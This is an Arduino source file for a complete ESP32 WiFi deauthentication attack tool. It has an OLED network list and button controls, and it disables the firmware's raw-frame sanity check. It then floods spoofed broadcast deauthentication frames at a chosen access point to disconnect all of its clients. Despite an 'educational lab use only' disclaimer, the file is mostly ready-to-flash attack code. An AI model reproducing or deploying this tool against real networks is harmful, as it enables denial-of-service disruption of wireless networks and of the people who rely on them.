/*
 * ESP32 Deauthentication Attack Tool (Educational Controlled Environment Use Only)
 * 
 * Hardware:
 * - ESP32 DevKit
 * - SSD1306 128x64 OLED (I2C: SDA=21, SCL=22)
 * - Push Button (GPIO 4, active LOW with INPUT_PULLUP)
 * 
 * Libraries Required:
 * - Adafruit SSD1306
 * - Adafruit GFX
 * - ESP32 Arduino Core
 * 
 * DISCLAIMER: This code is for educational purposes only in a controlled
 * lab environment. Unauthorized use against networks you do not own
 * is illegal and unethical.
 */

#include <WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "esp_wifi.h"

// ======================== PIN DEFINITIONS ========================
#define BUTTON_PIN        4
#define OLED_SDA          21
#define OLED_SCL          22
#define OLED_RESET        -1
#define SCREEN_WIDTH      128
#define SCREEN_HEIGHT     64
#define OLED_ADDR         0x3C

// ======================== TIMING CONSTANTS ========================
#define DEBOUNCE_MS              50
#define LONG_PRESS_MS            5000
#define TRIPLE_PRESS_WINDOW_MS   800
#define AUTO_SCAN_INTERVAL_MS    60000
#define DEAUTH_BURST_COUNT       20
#define DEAUTH_BURST_DELAY_MS    50

// ======================== STATE MACHINE ========================
enum SystemState {
  STATE_SCAN_IDLE,
  STATE_NAVIGATE,
  STATE_ATTACK_ACTIVE
};

SystemState currentState = STATE_SCAN_IDLE;

// ======================== NETWORK DATA ========================
#define MAX_NETWORKS 15

struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
  bool selected;
};

NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;
int selectedIndex = 0;

// ======================== OLED DISPLAY ========================
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ======================== BUTTON STATE MACHINE ========================
unsigned long lastDebounceTime = 0;
unsigned long buttonPressStart = 0;
unsigned long lastReleaseTime = 0;
int pressCount = 0;
bool lastButtonState = HIGH;
bool buttonPressed = false;
bool longPressHandled = false;

// ======================== TIMING TRACKERS ========================
unsigned long lastScanTime = 0;
unsigned long lastDisplayUpdate = 0;

// ======================== DEAUTH FRAME STRUCTURE ========================
typedef struct __attribute__((packed)) {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2];
  uint8_t reason[2];
} deauth_frame_t;

deauth_frame_t deauthFrame;

// ======================== RAW FRAME SANITY CHECK BYPASS ========================
// The ESP32 WiFi blob blocks deauth frames by default. This override
// disables the sanity check to allow raw 802.11 frame injection.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// ======================== SETUP ========================
void setup() {
  Serial.begin(115200);
  Serial.println("\n[BOOT] ESP32 Deauth Tool Starting...");
  
  // Initialize OLED
  Wire.begin(OLED_SDA, OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println("[ERROR] OLED init failed!");
    for (;;);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Deauth Tool");
  display.println("Initializing...");
  display.display();
  
  // Initialize button
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  
  // Initialize WiFi in Station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  // Initialize deauth frame template
  initDeauthFrame();
  
  // Initial scan
  scanNetworks();
  
  lastScanTime = millis();
  lastDisplayUpdate = millis();
  
  Serial.println("[BOOT] Ready.");
}

// ======================== MAIN LOOP ========================
void loop() {
  handleButton();
  handleAutoScan();
  
  // Update display periodically
  if (millis() - lastDisplayUpdate > 200) {
    updateDisplay();
    lastDisplayUpdate = millis();
  }
  
  // Run attack if active
  if (currentState == STATE_ATTACK_ACTIVE) {
    runDeauthAttack();
  }
  
  delay(10);
}

// ======================== DEAUTH FRAME INITIALIZATION ========================
void initDeauthFrame() {
  // Frame Control: Deauthentication (Type=0, Subtype=12)
  deauthFrame.frame_ctrl[0] = 0xC0;
  deauthFrame.frame_ctrl[1] = 0x00;
  
  // Duration
  deauthFrame.duration[0] = 0x00;
  deauthFrame.duration[1] = 0x00;
  
  // Fragment/Sequence
  deauthFrame.fragment_sequence[0] = 0xF0;
  deauthFrame.fragment_sequence[1] = 0xFF;
  
  // Reason code: 1 = Unspecified reason
  deauthFrame.reason[0] = 0x01;
  deauthFrame.reason[1] = 0x00;
}

// ======================== WIFI SCANNING ========================
void scanNetworks() {
  Serial.println("[SCAN] Scanning for networks...");
  
  // Pause attack if scanning
  bool wasAttacking = (currentState == STATE_ATTACK_ACTIVE);
  if (wasAttacking) {
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  }
  
  int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
  
  networkCount = 0;
  if (n > 0) {
    int limit = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
    for (int i = 0; i < limit; i++) {
      networks[i].ssid = WiFi.SSID(i);
      if (networks[i].ssid.length() == 0) {
        networks[i].ssid = "[Hidden]";
      }
      memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
      networks[i].channel = WiFi.channel(i);
      networks[i].rssi = WiFi.RSSI(i);
      networks[i].selected = false;
    }
    networkCount = limit;
  }
  
  // Reset selection index if out of bounds
  if (selectedIndex >= networkCount) {
    selectedIndex = 0;
  }
  
  WiFi.scanDelete();
  Serial.printf("[SCAN] Found %d networks\n", networkCount);
  
  // Restore attack if it was active
  if (wasAttacking && networkCount > 0) {
    if (selectedIndex < networkCount) {
      esp_wifi_set_channel(networks[selectedIndex].channel, WIFI_SECOND_CHAN_NONE);
    }
  }
}

// ======================== BUTTON HANDLING ========================
void handleButton() {
  bool reading = digitalRead(BUTTON_PIN);
  
  // Debounce
  if (reading != lastButtonState) {
    lastDebounceTime = millis();
  }
  
  if ((millis() - lastDebounceTime) > DEBOUNCE_MS) {
    // Button pressed (LOW due to INPUT_PULLUP)
    if (reading == LOW && !buttonPressed) {
      buttonPressed = true;
      buttonPressStart = millis();
      longPressHandled = false;
      Serial.println("[BTN] Pressed");
    }
    
    // Button held down
    if (reading == LOW && buttonPressed && !longPressHandled) {
      if (millis() - buttonPressStart >= LONG_PRESS_MS) {
        longPressHandled = true;
        handleLongPress();
      }
    }
    
    // Button released
    if (reading == HIGH && buttonPressed) {
      buttonPressed = false;
      unsigned long pressDuration = millis() - buttonPressStart;
      
      if (!longPressHandled) {
        // It was a short press
        if (pressDuration >= 50) { // Minimum valid press
          handleShortPress();
        }
      }
      
      lastReleaseTime = millis();
    }
  }
  
  lastButtonState = reading;
}

void handleShortPress() {
  unsigned long now = millis();
  
  // Check if this is a rapid successive press
  if (now - lastReleaseTime < TRIPLE_PRESS_WINDOW_MS) {
    pressCount++;
  } else {
    pressCount = 1;
  }
  
  Serial.printf("[BTN] Short press count: %d\n", pressCount);
  
  if (pressCount == 1) {
    // Single press: navigate to next network
    if (currentState == STATE_SCAN_IDLE) {
      currentState = STATE_NAVIGATE;
    }
    
    if (currentState == STATE_NAVIGATE && networkCount > 0) {
      selectedIndex = (selectedIndex + 1) % networkCount;
      Serial.printf("[NAV] Selected index: %d (%s)\n", 
                    selectedIndex, networks[selectedIndex].ssid.c_str());
    }
  }
  
  if (pressCount == 3) {
    // Triple press: force rescan
    Serial.println("[BTN] Triple press detected - Rescanning");
    pressCount = 0;
    scanNetworks();
    lastScanTime = millis();
  }
  
  // Reset press count after window expires
  if (pressCount > 3) {
    pressCount = 0;
  }
}

void handleLongPress() {
  Serial.println("[BTN] Long press detected");
  
  if (currentState == STATE_ATTACK_ACTIVE) {
    // Cancel attack
    Serial.println("[STATE] Cancelling attack");
    currentState = STATE_NAVIGATE;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  } else if (networkCount > 0 && selectedIndex < networkCount) {
    // Start attack
    Serial.printf("[STATE] Starting attack on %s (CH %d)\n",
                  networks[selectedIndex].ssid.c_str(),
                  networks[selectedIndex].channel);
    currentState = STATE_ATTACK_ACTIVE;
    prepareDeauthFrame(selectedIndex);
  }
}

// ======================== AUTO SCAN ========================
void handleAutoScan() {
  if (currentState == STATE_SCAN_IDLE || currentState == STATE_NAVIGATE) {
    if (millis() - lastScanTime > AUTO_SCAN_INTERVAL_MS && !buttonPressed) {
      Serial.println("[AUTO] Periodic rescan");
      scanNetworks();
      lastScanTime = millis();
    }
  }
}

// ======================== DEAUTH ATTACK ========================
void prepareDeauthFrame(int index) {
  if (index < 0 || index >= networkCount) return;
  
  // Set target BSSID as both sender and access point (spoofed)
  memcpy(deauthFrame.sender, networks[index].bssid, 6);
  memcpy(deauthFrame.access_point, networks[index].bssid, 6);
  
  // Set station to broadcast (deauth all clients)
  memset(deauthFrame.station, 0xFF, 6);
  
  // Set channel to target AP's channel
  esp_wifi_set_channel(networks[index].channel, WIFI_SECOND_CHAN_NONE);
  
  Serial.printf("[DEAUTH] Frame prepared for %s\n", networks[index].ssid.c_str());
}

void runDeauthAttack() {
  if (selectedIndex >= networkCount) return;
  
  // Send burst of deauth frames
  for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
    esp_err_t result = esp_wifi_80211_tx(
      WIFI_IF_STA,
      &deauthFrame,
      sizeof(deauthFrame),
      false
    );
    
    if (result != ESP_OK) {
      Serial.printf("[DEAUTH] TX error: %d\n", result);
    }
    
    delay(DEAUTH_BURST_DELAY_MS);
  }
  
  // Small delay between bursts to keep the system responsive
  delay(100);
}

// ======================== OLED DISPLAY ========================
void updateDisplay() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Header
  display.setCursor(0, 0);
  if (currentState == STATE_ATTACK_ACTIVE) {
    display.println(">> ATTACKING <<");
  } else {
    display.printf("Networks: %d", networkCount);
  }
  
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Network list (scrolling window)
  if (networkCount == 0) {
    display.setCursor(0, 20);
    display.println("No networks found");
    display.println("Press 3x to rescan");
  } else {
    // Show 4 networks at a time
    int startIdx = selectedIndex - 1;
    if (startIdx < 0) startIdx = 0;
    if (startIdx > networkCount - 4) startIdx = networkCount - 4;
    if (startIdx < 0) startIdx = 0;
    
    for (int i = 0; i < 4; i++) {
      int idx = startIdx + i;
      if (idx >= networkCount) break;
      
      int y = 14 + (i * 12);
      
      // Selection indicator
      if (idx == selectedIndex) {
        display.fillRect(0, y - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      
      display.setCursor(2, y);
      
      // Truncate SSID to fit
      String ssid = networks[idx].ssid;
      if (ssid.length() > 12) {
        ssid = ssid.substring(0, 11) + "~";
      }
      
      display.printf("%s", ssid.c_str());
      
      // Show channel on the right
      display.setCursor(90, y);
      display.printf("CH%d", networks[idx].channel);
      
      display.setTextColor(SSD1306_WHITE);
    }
  }
  
  // Footer hints
  display.drawLine(0, SCREEN_HEIGHT - 10, SCREEN_WIDTH, SCREEN_HEIGHT - 10, SSD1306_WHITE);
  display.setCursor(0, SCREEN_HEIGHT - 8);
  
  if (currentState == STATE_ATTACK_ACTIVE) {
    display.println("Hold 5s: STOP");
  } else {
    display.println("1x:Next 3x:Scan 5s:Atk");
  }
  
  display.display();
}
